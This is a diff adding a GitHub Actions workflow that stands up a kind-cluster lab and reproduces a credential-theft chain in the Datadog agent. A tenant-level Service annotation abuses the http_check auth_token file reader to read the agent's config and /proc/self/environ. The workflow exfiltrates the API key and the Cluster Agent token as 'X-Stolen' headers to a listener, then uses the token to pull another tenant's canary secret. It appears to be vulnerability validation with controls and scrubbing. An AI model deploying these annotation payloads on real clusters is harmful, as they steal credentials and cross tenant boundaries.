@@ -1,0 +1,492 @@
+name: dd-svcann-fileread
+
+# Run 4: http_check auth_token.reader file read through the Service annotation
+# cluster-check channel, and the credential chain to the Cluster Agent API.
+# Own lab only. Canary values only; secrets are scrubbed before artifact upload.
+
+on:
+  workflow_dispatch:
+    inputs:
+      agent_tag:
+        description: Datadog agent/cluster-agent image tag
+        default: "7.85.4"
+        required: false
+      chart_version:
+        description: Datadog helm chart version
+        default: "3.269.1"
+        required: false
+
+permissions:
+  contents: read
+
+jobs:
+  lab:
+    runs-on: ubuntu-latest
+    timeout-minutes: 55
+    env:
+      LAB: ${{ github.workspace }}/lab
+      AGENT_TAG: ${{ inputs.agent_tag }}
+      CHART_VERSION: ${{ inputs.chart_version }}
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir -p "$LAB/evidence"
+
+      - name: Install kind, kubectl, helm
+        run: |
+          set -eu
+          curl -fsSLo kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64 && chmod +x kind && sudo install -m0755 kind /usr/local/bin/kind
+          curl -fsSLo kubectl https://dl.k8s.io/release/v1.32.0/bin/linux/amd64/kubectl && chmod +x kubectl && sudo install -m0755 kubectl /usr/local/bin/kubectl
+          curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash >/dev/null
+          kind version | tee "$LAB/evidence/00-tools.txt"
+
+      - name: Create 2-node kind cluster
+        run: |
+          set -eu
+          cat > kind.yaml <<'EOF'
+          kind: Cluster
+          apiVersion: kind.x-k8s.io/v1alpha4
+          nodes:
+          - role: control-plane
+            image: kindest/node:v1.32.0
+          - role: worker
+            image: kindest/node:v1.32.0
+          EOF
+          kind create cluster --name dd-svcann --config kind.yaml --wait 240s
+          kubectl get nodes -o wide | tee "$LAB/evidence/00-nodes.txt"
+
+      - name: Namespaces, RBAC, customer canary Service, OAST listener
+        run: |
+          set -eu
+          kubectl create namespace tenant-a
+          kubectl create namespace customer
+          kubectl create namespace evidence
+          cat > author-rbac.yaml <<'EOF'
+          apiVersion: v1
+          kind: ServiceAccount
+          metadata:
+            name: svc-author
+            namespace: tenant-a
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: Role
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          rules:
+          - apiGroups: [""]
+            resources: ["services"]
+            verbs: ["create"]
+          ---
+          apiVersion: rbac.authorization.k8s.io/v1
+          kind: RoleBinding
+          metadata:
+            name: svc-create
+            namespace: tenant-a
+          subjects:
+          - kind: ServiceAccount
+            name: svc-author
+            namespace: tenant-a
+          roleRef:
+            kind: Role
+            name: svc-create
+            apiGroup: rbac.authorization.k8s.io
+          EOF
+          kubectl apply -f author-rbac.yaml
+          {
+            kubectl auth can-i --list -n tenant-a --as=system:serviceaccount:tenant-a:svc-author
+            echo "create services: $(kubectl auth can-i create services -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+            echo "create pods: $(kubectl auth can-i create pods -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+            echo "get secrets: $(kubectl auth can-i get secrets -n tenant-a --as=system:serviceaccount:tenant-a:svc-author || true)"
+          } > "$LAB/evidence/02-rbac.txt"
+          cat > oast.yaml <<'EOF'
+          apiVersion: v1
+          kind: ConfigMap
+          metadata:
+            name: oast-script
+            namespace: evidence
+          data:
+            server.py: |
+              import json
+              from http.server import BaseHTTPRequestHandler, HTTPServer
+              LOG = "/tmp/oast.log"
+              class H(BaseHTTPRequestHandler):
+                  def _log(self):
+                      try:
+                          n = int(self.headers.get("Content-Length") or 0)
+                      except Exception:
+                          n = 0
+                      body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
+                      rec = {"method": self.command, "path": self.path, "headers": dict(self.headers), "body": body}
+                      with open(LOG, "a") as f:
+                          f.write(json.dumps(rec) + "\n")
+                      self.send_response(200)
+                      self.send_header("Content-Type", "text/plain")
+                      self.end_headers()
+                      self.wfile.write(b"ok")
+                  do_GET = _log
+                  do_POST = _log
+                  def log_message(self, *a):
+                      pass
+              HTTPServer(("0.0.0.0", 8080), H).serve_forever()
+          ---
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: oast
+            namespace: evidence
+            labels:
+              app: oast
+          spec:
+            containers:
+            - name: oast
+              image: python:3.13-alpine
+              command: ["python3", "/script/server.py"]
+              ports:
+              - containerPort: 8080
+              volumeMounts:
+              - name: script
+                mountPath: /script
+            volumes:
+            - name: script
+              configMap:
+                name: oast-script
+          ---
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: oast
+            namespace: evidence
+          spec:
+            selector:
+              app: oast
+            ports:
+            - port: 8080
+              targetPort: 8080
+          EOF
+          kubectl apply -f oast.yaml
+          kubectl -n evidence wait --for=condition=Ready pod/oast --timeout=180s
+          kubectl -n evidence run curl --image=curlimages/curl:8.10.1 --restart=Never --command -- sleep 7200
+          kubectl -n evidence wait --for=condition=Ready pod/curl --timeout=180s
+          # cross-namespace canary cluster check the stolen DCA token must expose
+          cat > customer-canary.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: customer-db
+            namespace: customer
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"customer-canary","url":"http://127.0.0.1:1/","timeout":1,"auth_token":"CANARY_CUSTOMER_SECRET_9f3a2b"}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f customer-canary.yaml
+
+      - name: Install Datadog chart
+        env:
+          DD_API_KEY: ${{ secrets.DD_API_KEY }}
+          DD_APP_KEY: ${{ secrets.DD_APP_KEY }}
+        run: |
+          set -eu
+          umask 077
+          helm repo add datadog https://helm.datadoghq.com >/dev/null
+          helm repo update >/dev/null
+          cat > values.yaml <<'EOF'
+          registry: registry.datadoghq.com
+          datadog:
+            apiKey: __DD_API_KEY__
+            appKey: __DD_APP_KEY__
+            site: datadoghq.com
+            clusterName: dd-svcann-lab
+            logLevel: debug
+            kubelet:
+              tlsVerify: false
+            logs:
+              enabled: false
+            apm:
+              portEnabled: false
+            processAgent:
+              containerCollection: false
+              processCollection: false
+            orchestratorExplorer:
+              enabled: false
+            clusterChecks:
+              enabled: true
+          clusterAgent:
+            enabled: true
+            replicas: 1
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-control-plane
+            tolerations:
+            - key: node-role.kubernetes.io/control-plane
+              operator: Exists
+              effect: NoSchedule
+          agents:
+            image:
+              tag: __AGENT_TAG__
+            nodeSelector:
+              kubernetes.io/hostname: dd-svcann-worker
+            containers:
+              agent:
+                logLevel: debug
+          EOF
+          sed -i "s|__DD_API_KEY__|$DD_API_KEY|; s|__DD_APP_KEY__|$DD_APP_KEY|; s|__AGENT_TAG__|$AGENT_TAG|g" values.yaml
+          helm install datadog-agent datadog/datadog --version "$CHART_VERSION" -f values.yaml -n datadog --create-namespace --wait --timeout 12m || true
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=cluster-agent --timeout=300s
+          kubectl -n datadog wait --for=condition=Ready pod -l app.kubernetes.io/component=agent --timeout=300s
+          kubectl -n datadog get pods -o wide | tee "$LAB/evidence/01-pods-ready.txt"
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /etc/datadog-agent/datadog.yaml 2>&1; echo "---"; head -c 0 /proc/self/environ && echo "environ-readable"'
+
+      - name: T1 - auth_token.reader file read of the agent config path
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          NONCE=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+          echo "nonce=$NONCE agent=$AGENT_POD" | tee "$LAB/evidence/20-oast-datadog-yaml.txt"
+          cat > svc-read.yaml <<EOF
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-read-yaml
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"exfil-yaml","url":"http://oast.evidence.svc.cluster.local:8080/svc-file-$NONCE","timeout":5,"auth_token":{"reader":{"type":"file","path":"/etc/datadog-agent/datadog.yaml"},"writer":{"type":"header","name":"X-Stolen"}}}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-read.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 60
+          {
+            echo "=== DCA dispatch ==="
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=3000 | grep -aE "Dispatching configuration http_check" | tail -5
+            echo
+            echo "=== agent check log (yaml path) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=6000 | grep -aE "exfil-yaml|No such file|FileNotFound|auth_token|http_check" | tail -15
+            echo
+            echo "=== OAST requests for /svc-file-$NONCE ==="
+            kubectl -n evidence exec oast -- sh -c 'grep -c "svc-file-$NONCE" /tmp/oast.log 2>/dev/null || true'
+            kubectl -n evidence exec oast -- sh -c 'grep "svc-file-$NONCE" /tmp/oast.log 2>/dev/null | head -3' || true
+          } | tee -a "$LAB/evidence/20-oast-datadog-yaml.txt"
+
+      - name: T2 - auth_token.reader of /proc/self/environ (API key and DCA token)
+        run: |
+          set -eu
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          NONCE=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+          REAL_KEY=$(kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_API_KEY)
+          REAL_DCA=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          echo "nonce2=$NONCE" | tee "$LAB/evidence/21-oast-env-apikey.txt"
+          cat > svc-read-key.yaml <<EOF
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-read-key
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"exfil-key","url":"http://oast.evidence.svc.cluster.local:8080/svc-key-$NONCE","timeout":5,"auth_token":{"reader":{"type":"file","path":"/proc/self/environ","pattern":"DD_API_KEY=([0-9a-f]{32})"},"writer":{"type":"header","name":"X-Stolen-Key"}}}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-read-key.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 55
+          # extract the exfiltrated header and compare without printing the value
+          REC=$(kubectl -n evidence exec oast -- sh -c 'grep "svc-key-"$NONCE /tmp/oast.log | head -1' || true)
+          echo "$REC" > "$LAB/evidence/21-raw.json"
+          python3 - "$LAB/evidence/21-raw.json" "$REAL_KEY" "$LAB/evidence/21-oast-env-apikey.txt" <<'PY' | tee -a "$LAB/evidence/21-oast-env-apikey.txt"
+          import json, sys
+          raw, real, out = sys.argv[1], sys.argv[2], sys.argv[3]
+          try:
+              rec = json.loads(open(raw).read().strip())
+          except Exception as e:
+              open(out, "a").write(f"no oast record: {e}\n"); raise SystemExit
+          hdrs = {k.lower(): v for k, v in rec.get("headers", {}).items()}
+          val = hdrs.get("x-stolen-key")
+          open(out, "a").write(f"method={rec.get('method')} path={rec.get('path')}\n")
+          open(out, "a").write(f"x-stolen-key present={val is not None}")
+          if val is not None:
+              open(out, "a").write(f" len={len(val)} last4={val[-4:]} equals_real_api_key={val == real}\n")
+          else:
+              open(out, "a").write("\n")
+          PY
+          # DCA token in a second Service
+          NONCE3=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+          echo "nonce3=$NONCE3" | tee "$LAB/evidence/22-oast-env-dcatoken.txt"
+          cat > svc-read-dca.yaml <<EOF
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-read-dca
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"exfil-dca","url":"http://oast.evidence.svc.cluster.local:8080/svc-dca-$NONCE3","timeout":5,"auth_token":{"reader":{"type":"file","path":"/proc/self/environ","pattern":"DD_CLUSTER_AGENT_AUTH_TOKEN=([A-Za-z0-9]+)"},"writer":{"type":"header","name":"X-Stolen-Dca"}}}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-read-dca.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 55
+          kubectl -n evidence exec oast -- sh -c 'grep "svc-dca-"$NONCE3 /tmp/oast.log | head -1' > "$LAB/evidence/22-raw.json" 2>/dev/null || true
+          python3 - "$LAB/evidence/22-raw.json" "$REAL_DCA" "$LAB/evidence/22-oast-env-dcatoken.txt" <<'PY' | tee -a "$LAB/evidence/22-oast-env-dcatoken.txt"
+          import json, sys
+          raw, real, out = sys.argv[1], sys.argv[2], sys.argv[3]
+          try:
+              rec = json.loads(open(raw).read().strip())
+          except Exception as e:
+              open(out, "a").write(f"no oast record: {e}\n"); raise SystemExit
+          hdrs = {k.lower(): v for k, v in rec.get("headers", {}).items()}
+          val = hdrs.get("x-stolen-dca")
+          open(out, "a").write(f"x-stolen-dca present={val is not None}")
+          if val is not None:
+              open(out, "a").write(f" len={len(val)} last4={val[-4:]} equals_real_dca_token={val == real}\n")
+          else:
+              open(out, "a").write("\n")
+          open("/tmp/dca_token_exfil.txt", "w").write(val or "")
+          PY
+          # one read of the DCA API with the exfiltrated token (lab only)
+          {
+            echo "=== DCA API read with exfiltrated token ==="
+            TOKEN="$(cat /tmp/dca_token_exfil.txt)"
+            if [ -n "$TOKEN" ]; then
+              kubectl -n evidence exec curl -- curl -sk -m 20 -o /tmp/dca-body.json -w "http_status=%{http_code} bytes=%{size_download}\n" -H "Authorization: Bearer $TOKEN" https://datadog-agent-cluster-agent.datadog.svc:5005/api/v1/clusterchecks
+              kubectl -n evidence exec curl -- sh -c 'grep -o "customer-db" /tmp/dca-body.json | head -3; echo "customer_canary_present="$(grep -c "CANARY_CUSTOMER_SECRET_9f3a2b" /tmp/dca-body.json)'
+            else
+              echo "no exfiltrated token, chain stopped"
+            fi
+          } | tee "$LAB/evidence/23-dca-chain.txt"
+
+      - name: T3 - gate ON control
+        run: |
+          set -eu
+          DS=$(kubectl -n datadog get ds -o jsonpath='{.items[0].metadata.name}')
+          kubectl -n datadog set env "ds/$DS" DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS=true
+          kubectl -n datadog rollout status "ds/$DS" --timeout=300s
+          sleep 20
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          NONCE=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+          echo "agent=$AGENT_POD nonce=$NONCE" | tee "$LAB/evidence/30-gate-on.txt"
+          echo "gate env: $(kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS)" | tee -a "$LAB/evidence/30-gate-on.txt"
+          cat > svc-read-gate.yaml <<EOF
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-read-gate
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"exfil-gate","url":"http://oast.evidence.svc.cluster.local:8080/svc-gate-$NONCE","timeout":5,"auth_token":{"reader":{"type":"file","path":"/proc/self/environ","pattern":"DD_API_KEY=([0-9a-f]{32})"},"writer":{"type":"header","name":"X-Stolen-Gate"}}}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-read-gate.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 60
+          {
+            echo "=== provider error (expect) ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -aoE "Field '[^']+' is not allowed from untrusted provider '[^']+'" | sort -u | tail -3
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -aE "exfil-gate|ConfigurationError" | tail -6
+            echo
+            echo "=== OAST requests for /svc-gate-$NONCE (expect none) ==="
+            kubectl -n evidence exec oast -- sh -c 'grep -c "svc-gate-"$NONCE /tmp/oast.log 2>/dev/null || true'
+          } | tee -a "$LAB/evidence/30-gate-on.txt"
+
+      - name: T4 - controls
+        run: |
+          set -eu
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          NONCE=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+          # nonexistent path
+          cat > svc-read-missing.yaml <<EOF
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-read-missing
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/service.checks: |
+                {"http_check":{"instances":[{"name":"exfil-missing","url":"http://oast.evidence.svc.cluster.local:8080/svc-missing-$NONCE","timeout":5,"auth_token":{"reader":{"type":"file","path":"/tmp/definitely-not-here"},"writer":{"type":"header","name":"X-Stolen-Missing"}}}]}}
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-read-missing.yaml --as=system:serviceaccount:tenant-a:svc-author
+          # plain service
+          cat > svc-plain.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: svc-plain
+            namespace: tenant-a
+          spec:
+            selector:
+              app: nonexistent
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-plain.yaml --as=system:serviceaccount:tenant-a:svc-author
+          sleep 55
+          {
+            echo "=== nonexistent path: check error, no OAST hit expected ==="
+            kubectl -n datadog logs "$AGENT_POD" -c agent --tail=8000 | grep -aE "definitely-not-here|exfil-missing|No such file" | tail -8
+            kubectl -n evidence exec oast -- sh -c 'grep -c "svc-missing-"$NONCE /tmp/oast.log 2>/dev/null || true'
+            echo
+            echo "=== plain Service: no dispatch for svc-plain ==="
+            DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+            kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=3000 | grep -aE "Dispatching configuration" | tail -5
+          } | tee "$LAB/evidence/40-controls.txt"
+
+      - name: Final scrub and cleanup
+        if: always()
+        run: |
+          set +e
+          AGENT_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=agent -o jsonpath='{.items[0].metadata.name}')
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          REAL_KEY=$(kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_API_KEY)
+          REAL_DCA=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          REAL_APP="${{ secrets.DD_APP_KEY }}"
+          python3 - "$REAL_KEY" "$REAL_DCA" "$REAL_APP" <<'PY'
+          import glob, os, sys
+          key, dca, app = sys.argv[1], sys.argv[2], sys.argv[3]
+          for p in glob.glob("lab/evidence/*"):
+              try:
+                  s = open(p, errors="ignore").read()
+              except Exception:
+                  continue
+              for v, tag in ((key, "<REDACTED_API_KEY>"), (dca, "<REDACTED_DCA_TOKEN>"), (app, "<REDACTED_APP_KEY>")):
+                  if v and len(v) >= 8:
+                      s = s.replace(v, tag)
+              open(p, "w").write(s)
+          PY
+          kubectl -n tenant-a delete pod,svc --all --ignore-not-found >/dev/null 2>&1
+          kubectl -n evidence delete pod oast curl --ignore-not-found >/dev/null 2>&1
+          kubectl -n customer delete svc --all --ignore-not-found >/dev/null 2>&1
+          echo done
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: svcann-fileread-evidence
+          path: lab/evidence
